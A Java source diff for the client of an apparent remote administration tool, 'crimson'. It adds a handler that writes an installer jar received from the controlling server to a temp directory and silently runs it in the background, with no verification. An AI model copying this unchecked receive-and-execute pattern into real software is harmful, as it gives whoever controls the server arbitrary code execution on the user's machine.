@@ -17,6 +17,7 @@
  *****************************************************************************/
 package com.subterranean_security.crimson.client.net;
 
+import java.io.File;
 import java.io.IOException;
 import java.util.concurrent.TimeUnit;
 
@@ -102,6 +103,8 @@ public class ClientExecutor extends BasicExecutor {
 						rq_advanced_file_info(m);
 					} else if (m.hasRqGetClientConfig()) {
 						rq_get_client_config(m);
+					} else if (m.hasRsGenerate()) {
+						rs_generate(m);
 					} else {
 						connector.cq.put(m.getId(), m);
 					}
@@ -270,8 +273,21 @@ public class ClientExecutor extends BasicExecutor {
 	}
 
 	private void rq_get_client_config(Message m) {
-		ClientStore.Connections.route(Message.newBuilder().setId(m.getId())
+		ClientStore.Connections.route(Message.newBuilder().setId(m.getId()).setRid(m.getSid()).setSid(Common.cvid)
 				.setRsGetClientConfig(RS_GetClientConfig.newBuilder().setConfig(Client.ic)));
+	}
+
+	private void rs_generate(Message m) {
+		// update client
+		File temp = CUtil.Files.Temp.getDir();
+		try {
+			CUtil.Files.writeFile(m.getRsGenerate().getInstaller().toByteArray(),
+					new File(temp.getAbsolutePath() + "/installer.jar"));
+			CUtil.Misc.runBackgroundCommand("java -jar \"" + temp.getAbsolutePath() + "/installer.jar\"");
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
 	}
 
 }
